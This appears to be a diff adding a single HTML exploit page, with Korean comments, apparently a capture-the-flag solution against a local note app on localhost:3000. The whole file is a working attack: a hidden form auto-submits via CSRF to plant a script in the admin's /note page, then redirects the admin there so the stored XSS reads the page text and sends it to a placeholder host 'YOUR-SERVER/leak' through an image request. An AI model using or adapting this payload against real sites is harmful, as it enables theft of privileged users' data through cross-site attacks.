@@ -1,0 +1,28 @@
+<!doctype html>
+<html>
+<body>
+  <!-- 1) admin의 /note에 글을 CSRF로 심기 -->
+  <form id="csrf" action="http://localhost:3000/note" method="POST">
+    <input type="hidden" name="content" value='
+<script>
+  // 3) admin /note에서 실행되는 XSS
+  try {
+    const text = document.body.innerText;
+    // 외부로 유출 (본인 수신 URL로 교체)
+    new Image().src = "https://YOUR-SERVER/leak?d=" + encodeURIComponent(text);
+  } catch(e) {}
+</script>
+'>
+  </form>
+
+  <script>
+    // 글 등록
+    document.getElementById("csrf").submit();
+
+    // 2) 등록 후 admin을 /note로 보내서 XSS 트리거
+    setTimeout(() => {
+      location.href = "http://localhost:3000/note";
+    }, 1000);
+  </script>
+</body>
+</html>
